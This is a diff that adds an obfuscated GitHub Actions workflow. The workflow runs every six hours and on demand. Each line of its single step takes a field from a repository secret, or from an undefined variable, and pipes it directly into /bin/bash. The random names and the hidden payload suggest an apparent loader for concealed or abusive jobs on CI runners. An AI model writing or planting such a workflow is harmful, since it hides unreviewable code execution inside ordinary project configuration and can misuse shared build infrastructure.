@@ -1,0 +1,32 @@
+name: danfangmahzneha
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '43 2/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: danfangmahzneha
+        env:
+          fgzq56: ${{ secrets.fgzq56 }}
+        run: |
+          echo $fgzq56 | jq -r .agrq8 | /bin/bash
+          echo $qljil7 | jq -r .hfsm9 | /bin/bash
+          echo $gdosi8538 | jq -r .cbk80 | /bin/bash
+          echo $jttuj328 | jq -r .sorl766 | /bin/bash
+          echo $f1 | jq -r .ep3084 | /bin/bash
+          echo $x23 | jq -r .an9316 | /bin/bash
+          echo $mu779 | jq -r .vg44079 | /bin/bash
+          echo $u1 | jq -r .x590 | /bin/bash
+          echo $q3464 | jq -r .icn7 | /bin/bash
+          echo $jrfp5 | jq -r .ap1 | /bin/bash
+          echo $ni1 | jq -r .flclk9020 | /bin/bash
+          echo $jh06657 | jq -r .xd53 | /bin/bash
+          echo $c684 | jq -r .tb1 | /bin/bash
+          echo $jh021 | jq -r .usz663 | /bin/bash
+
